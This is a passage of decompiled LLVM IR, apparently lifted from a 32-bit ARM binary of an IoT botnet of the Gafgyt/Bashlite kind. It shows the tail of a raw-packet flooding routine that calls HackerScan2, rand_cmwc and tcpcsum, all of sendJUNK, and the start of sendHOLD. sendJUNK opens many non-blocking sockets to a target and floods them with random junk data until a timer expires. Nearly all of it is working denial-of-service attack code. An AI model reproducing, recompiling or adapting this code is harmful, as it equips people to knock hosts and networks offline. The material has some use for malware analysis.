  %v1_10bd4 = or i32 %v3_1089c, 2
  store i32 %v1_10bd4, i32* %r3.global-to-local, align 4
  %v1_10bd8 = inttoptr i32 %v1_10bd4 to i8*
  %v2_10bd8 = load i8, i8* %v1_10bd8, align 2
  %v3_10bd8 = zext i8 %v2_10bd8 to i32
  store i32 %v3_10bd8, i32* %r2.global-to-local, align 4
  %v1_10bdc = or i32 %v1_10898, 3
  %v2_10bdc = inttoptr i32 %v1_10bdc to i8*
  %v3_10bdc = load i8, i8* %v2_10bdc, align 1
  %v4_10bdc = zext i8 %v3_10bdc to i32
  %v4_10be0 = mul nuw nsw i32 %v4_10bdc, 256
  %v5_10be0 = or i32 %v4_10be0, %v3_10bd8
  store i32 %v5_10be0, i32* %r3.global-to-local, align 4
  %v3_10bec = call i32 @csum(i8* %v4_108f8, i32 %v5_10be0)
  %sext4 = mul i32 %v3_10bec, 16777216
  %v1_10bf0 = sdiv i32 %sext4, 16777216
  store i32 %v1_10bf0, i32* %r3.global-to-local, align 4
  store i32 %v3_1089c, i32* %r2.global-to-local, align 4
  %v1_10bf8 = trunc i32 %v1_10bf0 to i8
  %v3_10bf8 = add i32 %v3_1089c, 10
  %v4_10bf8 = inttoptr i32 %v3_10bf8 to i8*
  store i8 %v1_10bf8, i8* %v4_10bf8, align 2
  %v0_10bfc = load i32, i32* %r3.global-to-local, align 4
  %v3_10bfc = sdiv i32 %v0_10bfc, 256
  store i32 %v3_10bfc, i32* %r3.global-to-local, align 4
  %v1_10c00 = trunc i32 %v3_10bfc to i8
  %v2_10c00 = load i32, i32* %r2.global-to-local, align 4
  %v3_10c00 = add i32 %v2_10c00, 11
  %v4_10c00 = inttoptr i32 %v3_10c00 to i8*
  store i8 %v1_10c00, i8* %v4_10c00, align 1
  %v2_10c08 = call i32 @__GI_time(i32* null)
  %v2_10c14 = add i32 %v2_10c08, %arg3
  store i32 %v2_10c14, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_10c6c = add i32 %v3_1089c, 12
  %v3_10c6c = inttoptr i32 %v2_10c6c to i32*
  %v3_10c84 = add i32 %v3_1089c, 4
  %v4_10c84 = inttoptr i32 %v3_10c84 to i8*
  %v4_10ccc = add i32 %v3_1089c, 37
  %v5_10ccc = inttoptr i32 %v4_10ccc to i8*
  br label %dec_label_pc_10c28

dec_label_pc_10c28:                               ; preds = %dec_label_pc_10d60, %dec_label_pc_10d54, %dec_label_pc_10b90
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10b90 ], [ 0, %dec_label_pc_10d54 ], [ %v1_10d64, %dec_label_pc_10d60 ]
  store i32 %v3_1089c, i32* %r2.global-to-local, align 4
  %v1_10c30 = load i32, i32* @sp, align 4
  %v2_10c30 = inttoptr i32 %v1_10c30 to i32*
  store i32 %v2_10798, i32* %v2_10c30, align 4
  %v1_10c38 = load i32, i32* @sp, align 4
  %v2_10c38 = add i32 %v1_10c38, 4
  %v3_10c38 = inttoptr i32 %v2_10c38 to i32*
  store i32 16, i32* %v3_10c38, align 4
  %v0_10c40 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1086c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_10c4c = inttoptr i32 %v0_10c40 to i32*
  %v7_10c4c = call i32 @__libc_sendto(i32 %v0_107bc, i32* %v6_10c4c, i32 %v1_1086c, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_10c54 = call i32 @HackerScan2(i32 %storemerge10)
  store i32 %v1_10c54, i32* %r3.global-to-local, align 4
  %v1_10c60 = call i32 @htonl(i32 %v1_10c54)
  store i32 %v1_10c60, i32* %r2.global-to-local, align 4
  store i32 %v3_1089c, i32* %r3.global-to-local, align 4
  store i32 %v1_10c60, i32* %v3_10c6c, align 4
  %v0_10c70 = call i32 @rand_cmwc()
  %v3_10c7c = urem i32 %v0_10c70, 65536
  store i32 %v3_10c7c, i32* %r3.global-to-local, align 4
  store i32 %v3_1089c, i32* %r2.global-to-local, align 4
  %v1_10c84 = trunc i32 %v0_10c70 to i8
  store i8 %v1_10c84, i8* %v4_10c84, align 4
  %v0_10c88 = load i32, i32* %r3.global-to-local, align 4
  %v3_10c88 = sdiv i32 %v0_10c88, 256
  store i32 %v3_10c88, i32* %r3.global-to-local, align 4
  %v1_10c8c = trunc i32 %v3_10c88 to i8
  %v2_10c8c = load i32, i32* %r2.global-to-local, align 4
  %v3_10c8c = add i32 %v2_10c8c, 5
  %v4_10c8c = inttoptr i32 %v3_10c8c to i8*
  store i8 %v1_10c8c, i8* %v4_10c8c, align 1
  %v0_10c90 = call i32 @rand_cmwc()
  store i32 %v0_10c90, i32* %r2.global-to-local, align 4
  store i32 %v1_108bc, i32* %r3.global-to-local, align 4
  store i32 %v0_10c90, i32* %v3_10928, align 4
  %v0_10ca0 = call i32 @rand_cmwc()
  %v3_10cac = urem i32 %v0_10ca0, 65536
  store i32 %v3_10cac, i32* %r3.global-to-local, align 4
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v1_10cb4 = trunc i32 %v0_10ca0 to i8
  store i8 %v1_10cb4, i8* %v5_108c0, align 4
  %v0_10cb8 = load i32, i32* %r3.global-to-local, align 4
  %v3_10cb829 = udiv i32 %v0_10cb8, 256
  %v1_10cbc = trunc i32 %v3_10cb829 to i8
  %v2_10cbc = load i32, i32* %r2.global-to-local, align 4
  %v3_10cbc = add i32 %v2_10cbc, 1
  %v4_10cbc = inttoptr i32 %v3_10cbc to i8*
  store i8 %v1_10cbc, i8* %v4_10cbc, align 1
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v4_10b38, align 4
  store i8 0, i8* %v5_10ccc, align 1
  %v5_10cd8 = call i32 @tcpcsum(i32 %v3_1089c, i32 %v1_108bc, i32 %v1_108bc, i32 0)
  %sext5 = mul i32 %v5_10cd8, 16777216
  %v1_10cdc = sdiv i32 %sext5, 16777216
  store i32 %v1_10cdc, i32* %r3.global-to-local, align 4
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v1_10ce4 = trunc i32 %v1_10cdc to i8
  store i8 %v1_10ce4, i8* %v4_10b38, align 4
  %v0_10ce8 = load i32, i32* %r3.global-to-local, align 4
  %v3_10ce830 = udiv i32 %v0_10ce8, 256
  %v1_10cec = trunc i32 %v3_10ce830 to i8
  %v2_10cec = load i32, i32* %r2.global-to-local, align 4
  %v3_10cec = add i32 %v2_10cec, 17
  %v4_10cec = inttoptr i32 %v3_10cec to i8*
  store i8 %v1_10cec, i8* %v4_10cec, align 1
  store i32 %v1_10bd4, i32* %r3.global-to-local, align 4
  %v2_10d00 = load i8, i8* %v1_10bd8, align 2
  %v3_10d00 = zext i8 %v2_10d00 to i32
  store i32 %v3_10d00, i32* %r2.global-to-local, align 4
  %v3_10d04 = load i8, i8* %v2_10bdc, align 1
  %v4_10d04 = zext i8 %v3_10d04 to i32
  %v4_10d08 = mul nuw nsw i32 %v4_10d04, 256
  %v5_10d08 = or i32 %v4_10d08, %v3_10d00
  store i32 %v5_10d08, i32* %r3.global-to-local, align 4
  %v3_10d14 = call i32 @csum(i8* %v4_108f8, i32 %v5_10d08)
  %sext6 = mul i32 %v3_10d14, 16777216
  %v1_10d18 = sdiv i32 %sext6, 16777216
  store i32 %v1_10d18, i32* %r3.global-to-local, align 4
  store i32 %v3_1089c, i32* %r2.global-to-local, align 4
  %v1_10d20 = trunc i32 %v1_10d18 to i8
  store i8 %v1_10d20, i8* %v4_10bf8, align 2
  %v0_10d24 = load i32, i32* %r3.global-to-local, align 4
  %v3_10d2431 = udiv i32 %v0_10d24, 256
  %v1_10d28 = trunc i32 %v3_10d2431 to i8
  %v2_10d28 = load i32, i32* %r2.global-to-local, align 4
  %v3_10d28 = add i32 %v2_10d28, 11
  %v4_10d28 = inttoptr i32 %v3_10d28 to i8*
  store i8 %v1_10d28, i8* %v4_10d28, align 1
  store i32 %stack_var_-88.0, i32* %r3.global-to-local, align 4
  %v9_10d34 = icmp eq i32 %stack_var_-88.0, %arg7
  br i1 %v9_10d34, label %dec_label_pc_10d3c, label %dec_label_pc_10d60

dec_label_pc_10d3c:                               ; preds = %dec_label_pc_10c28
  %v2_10d40 = call i32 @__GI_time(i32* null)
  store i32 %v2_10d40, i32* %r2.global-to-local, align 4
  store i32 %v2_10c14, i32* %r3.global-to-local, align 4
  %v8_10d50 = icmp sgt i32 %v2_10d40, %v2_10c14
  br i1 %v8_10d50, label %dec_label_pc_10d70, label %dec_label_pc_10d54

dec_label_pc_10d54:                               ; preds = %dec_label_pc_10d3c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10c28

dec_label_pc_10d60:                               ; preds = %dec_label_pc_10c28
  %v1_10d64 = add i32 %stack_var_-88.0, 1
  store i32 %v1_10d64, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10c28

dec_label_pc_10d70:                               ; preds = %dec_label_pc_10d3c, %dec_label_pc_10774, %dec_label_pc_10820, %dec_label_pc_107d4
  %v12_10d78 = phi i32 [ %v3_10784, %dec_label_pc_10774 ], [ %v3_10830, %dec_label_pc_10820 ], [ %v3_107e4, %dec_label_pc_107d4 ], [ %v2_10d40, %dec_label_pc_10d3c ]
  store i32 %v3_106e8, i32* @r4, align 4
  store i32 %v6_106e8, i32* @fp, align 4
  ret i32 %v12_10d78

; uselistorder directives
  uselistorder i32 %v1_10d64, { 1, 0 }
  uselistorder i32 %v1_10d18, { 1, 0 }
  uselistorder i32 %v1_10cdc, { 1, 0 }
  uselistorder i32 %v0_10ca0, { 1, 0 }
  uselistorder i32 %v3_10c88, { 1, 0 }
  uselistorder i32 %v0_10c70, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 0, 2, 1 }
  uselistorder i32 %v2_10c14, { 1, 0, 2 }
  uselistorder i32 %v3_10bfc, { 1, 0 }
  uselistorder i32 %v1_10bf0, { 1, 0 }
  uselistorder i32 %v1_10bd4, { 0, 2, 1 }
  uselistorder i32 %v1_10bb4, { 1, 0 }
  uselistorder i32 %v3_10ba0, { 2, 0, 1 }
  uselistorder i8 %v0_10b5c.sink.off0, { 1, 0 }
  uselistorder i32 %v3_10b7c, { 1, 0 }
  uselistorder i32 %v0_10b5c, { 1, 0 }
  uselistorder i32 %v0_10b10, { 1, 0 }
  uselistorder i32 %v3_10af8, { 1, 0, 2 }
  uselistorder i32 %storemerge1421, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_10a08, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i8* %v2_1097c, { 1, 5, 2, 6, 3, 7, 4, 8, 0, 9 }
  uselistorder i32 %v3_10914, { 1, 0 }
  uselistorder i32 %v0_108fc, { 1, 0 }
  uselistorder i32 %v1_108bc, { 5, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 22, 21, 20, 19, 18, 0, 1, 2, 3, 4, 23, 24, 25, 26 }
  uselistorder i32 %v3_1089c, { 12, 11, 10, 8, 6, 23, 9, 7, 4, 5, 22, 3, 21, 20, 19, 18, 17, 16, 24, 15, 14, 13, 2, 1, 0 }
  uselistorder i32 %v1_1086c, { 1, 0 }
  uselistorder i32 %v3_10758, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 7, 8, 5, 6, 12, 13, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 23, 24, 28, 29, 27, 30, 31, 32, 33, 34, 35, 36, 37, 38, 55, 39, 40, 42, 41, 43, 45, 44, 46, 48, 47, 49, 51, 50, 52, 54, 53, 1, 56, 57, 58, 59, 60, 61, 64, 62, 63, 65, 66, 67, 68, 70, 69, 71, 72, 73, 75, 74, 76, 77, 78, 80, 79, 81, 82, 83, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @HackerScan2, { 3, 2, 1, 0, 4 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_10d70, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10b90, { 1, 0 }
  uselistorder label %dec_label_pc_10af0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_109e8, { 1, 0 }
  uselistorder label %dec_label_pc_10868, { 1, 0 }
  uselistorder label %dec_label_pc_10774, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10dac = load i32, i32* @r4, align 4
  store i32 %v3_10dac, i32* %stack_var_-20, align 4
  %v6_10dac = load i32, i32* @fp, align 4
  store i32 69044, i32* %stack_var_-4, align 4
  %v2_10db0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10db0, i32* @fp, align 4
  %v0_10dcc = call i32 @getdtablesize()
  %tmp = icmp slt i32 %v0_10dcc, 0
  %v3_10dd4 = zext i1 %tmp to i32
  %v2_10dd8 = add i32 %v3_10dd4, %v0_10dcc
  %v3_10ddc = sdiv i32 %v2_10dd8, 2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v3_10dfc = urem i32 %arg2, 65536
  %v1_10e04 = call i32 @htons(i32 %v3_10dfc)
  %v3_10e28 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_10e30 = icmp eq i32 %v3_10e28, 0
  br i1 %v2_10e30, label %dec_label_pc_10e3c, label %dec_label_pc_112b4

dec_label_pc_10e3c:                               ; preds = %entry
  %v16_10dac = ptrtoint i32* %stack_var_-20 to i32
  %v3_10e58 = mul i32 %v3_10ddc, 8
  %v1_10e5c = or i32 %v3_10e58, 3
  %v1_10e60 = add i32 %v1_10e5c, 3
  %v3_10e64 = and i32 %v1_10e60, -4
  %v1_10e6c = load i32, i32* @sp, align 4
  %v2_10e6c = sub i32 %v1_10e6c, %v3_10e64
  %v1_10e7c = add i32 %v2_10e6c, 7
  %v3_10e80 = and i32 %v1_10e7c, -4
  %v2_10ea4 = mul i32 %v3_10ddc, 5
  store i32 %v2_10ea4, i32* @r2, align 4
  %v2_10eb8 = inttoptr i32 %v3_10e80 to i8*
  %v3_10eb8 = call i32 @__GI_memset(i8* %v2_10eb8, i32 0)
  %v1_10ec0 = call i32 @malloc(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_10edc = inttoptr i32 %v1_10ec0 to i8*
  %v3_10edc = call i32 @__GI_memset(i8* %v2_10edc, i32 0)
  %v2_10ee4 = call i32 @__GI_time(i32* null)
  store i32 %v2_10ee4, i32* %r2.global-to-local, align 4
  %v2_10ef0 = add i32 %v2_10ee4, %arg3
  %v2_1102c = ptrtoint i32* %stack_var_-196 to i32
  %v2_110f0 = ptrtoint i32* %stack_var_-204 to i32
  %v2_11138 = ptrtoint i32* %stack_var_-208 to i32
  %v4_11228 = inttoptr i32 %v1_10ec0 to i32*
  %v3_10fcc = bitcast i32* %stack_var_-68 to %sockaddr*
  %v8_1129448 = icmp sgt i32 %v2_10dd8, 1
  %v2_10f18 = add i32 %v3_10e80, 4
  %v2_11088 = add i32 %v16_10dac, -176
  br label %dec_label_pc_1129c

dec_label_pc_10f08:                               ; preds = %dec_label_pc_1128c.preheader, %dec_label_pc_11280
  %storemerge251 = phi i32 [ %v1_11284, %dec_label_pc_11280 ], [ 0, %dec_label_pc_1128c.preheader ]
  store i32 %v3_10e80, i32* %r2.global-to-local, align 4
  %v3_10f14 = mul i32 %storemerge251, 8
  %v2_10f1c = add i32 %v2_10f18, %v3_10f14
  %v1_10f20 = inttoptr i32 %v2_10f1c to i8*
  %v2_10f20 = load i8, i8* %v1_10f20, align 4
  %v6_10f2c = icmp eq i8 %v2_10f20, 0
  %v7_10f2c = icmp eq i8 %v2_10f20, 1
  br i1 %v7_10f2c, label %dec_label_pc_11040.lr.ph, label %dec_label_pc_10f34

dec_label_pc_10f34:                               ; preds = %dec_label_pc_10f08
  %v7_10f38 = icmp eq i8 %v2_10f20, 2
  br i1 %v7_10f38, label %dec_label_pc_11200, label %dec_label_pc_10f40

dec_label_pc_10f40:                               ; preds = %dec_label_pc_10f34
  br i1 %v6_10f2c, label %dec_label_pc_10f50, label %dec_label_pc_11280

dec_label_pc_10f50:                               ; preds = %dec_label_pc_10f40
  store i32 %storemerge251, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_10f60 = call i32 @socket()
  %v2_10f6c = load i32, i32* @r4, align 4
  %v5_10f6c = mul i32 %v2_10f6c, 8
  %v6_10f6c = add i32 %v5_10f6c, %v3_10e80
  %v7_10f6c = inttoptr i32 %v6_10f6c to i32*
  store i32 %v0_10f60, i32* %v7_10f6c, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v5_10f78 = add i32 %v3_10f14, %v3_10e80
  %v6_10f78 = inttoptr i32 %v5_10f78 to i32*
  %v7_10f78 = load i32, i32* %v6_10f78, align 4
  store i32 %v7_10f78, i32* @r4, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_10f84 = load i32, i32* %v6_10f78, align 4
  store i32 0, i32* @r2, align 4
  %v2_10f94 = call i32 @__libc_fcntl(i32 %v7_10f84, i32 3)
  %v1_10f9c = or i32 %v2_10f94, 2048
  %v0_10fa0 = load i32, i32* @r4, align 4
  store i32 %v1_10f9c, i32* @r2, align 4
  %v2_10fac = call i32 @__libc_fcntl(i32 %v0_10fa0, i32 4)
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_10fb8 = load i32, i32* %v6_10f78, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_10fcc = call i32 @__libc_connect(i32 %v7_10fb8, %sockaddr* %v3_10fcc, i32 16)
  %v3_10fd4 = icmp eq i32 %v4_10fcc, -1
  br i1 %v3_10fd4, label %dec_label_pc_10fdc, label %dec_label_pc_10ff0

dec_label_pc_10fdc:                               ; preds = %dec_label_pc_10f50
  %v0_10fdc = call i32 @__errno_location()
  %v1_10fe4 = inttoptr i32 %v0_10fdc to i32*
  %v2_10fe4 = load i32, i32* %v1_10fe4, align 4
  %v7_10fe8 = icmp eq i32 %v2_10fe4, 115
  br i1 %v7_10fe8, label %dec_label_pc_11008, label %dec_label_pc_10ff0

dec_label_pc_10ff0:                               ; preds = %dec_label_pc_10f50, %dec_label_pc_10fdc
  store i32 %v3_10e80, i32* %r2.global-to-local, align 4
  %v7_10ff8 = load i32, i32* %v6_10f78, align 4
  %v1_11000 = call i32 @__libc_close(i32 %v7_10ff8)
  br label %dec_label_pc_11280

dec_label_pc_11008:                               ; preds = %dec_label_pc_10fdc
  store i32 %v2_10f1c, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_10f20, align 4
  br label %dec_label_pc_11280

dec_label_pc_11040.lr.ph:                         ; preds = %dec_label_pc_10f08
  br label %dec_label_pc_11040

dec_label_pc_11040:                               ; preds = %dec_label_pc_11040.lr.ph, %dec_label_pc_11040
  %storemerge37 = phi i32 [ 0, %dec_label_pc_11040.lr.ph ], [ %v1_11054, %dec_label_pc_11040 ]
  store i32 %v2_1102c, i32* %r2.global-to-local, align 4
  %v5_1104c = mul nuw nsw i32 %storemerge37, 4
  %v6_1104c = add i32 %v5_1104c, %v2_1102c
  %v7_1104c = inttoptr i32 %v6_1104c to i32*
  store i32 0, i32* %v7_1104c, align 4
  %v1_11054 = add nuw nsw i32 %storemerge37, 1
  %tmp42 = icmp ult i32 %v1_11054, 32
  br i1 %tmp42, label %dec_label_pc_11040, label %dec_label_pc_11068

dec_label_pc_11068:                               ; preds = %dec_label_pc_11040
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v5_11070 = add i32 %v3_10f14, %v3_10e80
  %v6_11070 = inttoptr i32 %v5_11070 to i32*
  %v7_11070 = load i32, i32* %v6_11070, align 4
  %v3_11074 = udiv i32 %v7_11070, 32
  store i32 -176, i32* %r2.global-to-local, align 4
  %v3_11080 = mul nuw nsw i32 %v3_11074, 4
  %v2_1108c = add i32 %v2_11088, %v3_11080
  %v1_11090 = inttoptr i32 %v2_1108c to i32*
  %v2_11090 = load i32, i32* %v1_11090, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_1109c = load i32, i32* %v6_11070, align 4
  %v1_110a0 = urem i32 %v7_1109c, 32
  %v6_110a8 = shl i32 1, %v1_110a0
  %v2_110ac = or i32 %v6_110a8, %v2_11090
  store i32 %v2_110ac, i32* %v1_11090, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_110e4 = load i32, i32* %v6_11070, align 4
  %v1_110e8 = add i32 %v7_110e4, 1
  store i32 %v1_110e8, i32* %r2.global-to-local, align 4
  %v1_110f4 = load i32, i32* @sp, align 4
  %v2_110f4 = inttoptr i32 %v1_110f4 to i32*
  store i32 %v2_110f0, i32* %v2_110f4, align 4
  %v0_110f8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_1102c, i32* %r2.global-to-local, align 4
  %v4_11108 = load i32, i32* %stack_var_-204, align 4
  %v5_11108 = call i32 @__libc_select(i32 %v0_110f8, i32 0, i32 %v2_1102c, i32 0, i32 %v4_11108)
  %v7_11118 = icmp eq i32 %v5_11108, 1
  br i1 %v7_11118, label %dec_label_pc_11120, label %dec_label_pc_111bc

dec_label_pc_11120:                               ; preds = %dec_label_pc_11068
  store i32 4, i32* %stack_var_-208, align 4
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_11130 = load i32, i32* %v6_11070, align 4
  store i32 %v7_11130, i32* %r2.global-to-local, align 4
  %v1_1113c = load i32, i32* @sp, align 4
  %v2_1113c = inttoptr i32 %v1_1113c to i32*
  store i32 %v2_11138, i32* %v2_1113c, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_11150 = call i32 @getsockopt()
  %v3_11154 = load i32, i32* %stack_var_-212, align 4
  %v2_11158 = icmp eq i32 %v3_11154, 0
  br i1 %v2_11158, label %dec_label_pc_11198, label %dec_label_pc_11160

dec_label_pc_11160:                               ; preds = %dec_label_pc_11120
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_11168 = load i32, i32* %v6_11070, align 4
  %v1_11170 = call i32 @__libc_close(i32 %v7_11168)
  store i32 %v2_10f1c, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_10f20, align 4
  br label %dec_label_pc_11280

dec_label_pc_11198:                               ; preds = %dec_label_pc_11120
  store i32 %v2_10f1c, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_10f20, align 4
  br label %dec_label_pc_11280

dec_label_pc_111bc:                               ; preds = %dec_label_pc_11068
  %v3_111c0 = icmp eq i32 %v5_11108, -1
  br i1 %v3_111c0, label %dec_label_pc_111c8, label %dec_label_pc_11280

dec_label_pc_111c8:                               ; preds = %dec_label_pc_111bc
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_111d0 = load i32, i32* %v6_11070, align 4
  %v1_111d8 = call i32 @__libc_close(i32 %v7_111d0)
  store i32 %v2_10f1c, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_10f20, align 4
  br label %dec_label_pc_11280

dec_label_pc_11200:                               ; preds = %dec_label_pc_10f34
  %v2_11208 = call i32 @makeRandomStr(i32 %v1_10ec0, i32 1024)
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v5_11214 = add i32 %v3_10f14, %v3_10e80
  %v6_11214 = inttoptr i32 %v5_11214 to i32*
  %v7_11214 = load i32, i32* %v6_11214, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v5_11228 = call i32 @__libc_send(i32 %v7_11214, i32* %v4_11228, i32 1024, i32 16384)
  %v3_11230 = icmp eq i32 %v5_11228, -1
  br i1 %v3_11230, label %dec_label_pc_11238, label %dec_label_pc_11280

dec_label_pc_11238:                               ; preds = %dec_label_pc_11200
  %v0_11238 = call i32 @__errno_location()
  %v1_11240 = inttoptr i32 %v0_11238 to i32*
  %v2_11240 = load i32, i32* %v1_11240, align 4
  %v7_11244 = icmp eq i32 %v2_11240, 11
  br i1 %v7_11244, label %dec_label_pc_11280, label %dec_label_pc_1124c

dec_label_pc_1124c:                               ; preds = %dec_label_pc_11238
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_11254 = load i32, i32* %v6_11214, align 4
  %v1_1125c = call i32 @__libc_close(i32 %v7_11254)
  store i32 %v2_10f1c, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_10f20, align 4
  br label %dec_label_pc_11280

dec_label_pc_11280:                               ; preds = %dec_label_pc_10f40, %dec_label_pc_111bc, %dec_label_pc_11200, %dec_label_pc_11238, %dec_label_pc_111c8, %dec_label_pc_11198, %dec_label_pc_11160, %dec_label_pc_11008, %dec_label_pc_10ff0, %dec_label_pc_1124c
  %v1_11284 = add nuw nsw i32 %storemerge251, 1
  store i32 %v1_11284, i32* %r2.global-to-local, align 4
  %v5_11298 = icmp slt i32 %v1_11284, %v3_10ddc
  br i1 %v5_11298, label %dec_label_pc_10f08, label %dec_label_pc_1129c

dec_label_pc_1129c:                               ; preds = %dec_label_pc_1128c.preheader, %dec_label_pc_11280, %dec_label_pc_10e3c
  %v2_112a0 = call i32 @__GI_time(i32* null)
  store i32 %v2_112a0, i32* %r2.global-to-local, align 4
  %v5_112b0 = icmp slt i32 %v2_112a0, %v2_10ef0
  br i1 %v5_112b0, label %dec_label_pc_1128c.preheader, label %dec_label_pc_112b4

dec_label_pc_1128c.preheader:                     ; preds = %dec_label_pc_1129c
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_1129448, label %dec_label_pc_10f08, label %dec_label_pc_1129c

dec_label_pc_112b4:                               ; preds = %dec_label_pc_1129c, %entry
  %v12_112bc = phi i32 [ %v3_10e28, %entry ], [ %v2_112a0, %dec_label_pc_1129c ]
  %v2_112bc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_112bc, i32* @r4, align 4
  store i32 %v6_10dac, i32* @fp, align 4
  ret i32 %v12_112bc

; uselistorder directives
  uselistorder i32 %v1_11284, { 2, 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i8* %v1_10f20, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_10f1c, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v3_10f14, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge251, { 0, 8, 7, 6, 5, 4, 3, 2, 1, 12, 11, 10, 9, 13 }
  uselistorder i32 %v2_1102c, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10ec0, { 1, 0, 2 }
  uselistorder i32 %v3_10e80, { 0, 1, 5, 2, 3, 4, 7, 6 }
  uselistorder i32 %v3_10ddc, { 1, 2, 0 }
  uselistorder i32 %v0_10dcc, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 33, 30, 29, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 31, 32, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 2, 1, 0 }
  uselistorder i32 -176, { 1, 0 }
  uselistorder label %dec_label_pc_11280, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_11040, { 1, 0 }
  uselistorder label %dec_label_pc_10ff0, { 1, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_112c4 = load i32, i32* @r4, align 4
  store i32 %v3_112c4, i32* %stack_var_-20, align 4
  %v6_112c4 = load i32, i32* @fp, align 4
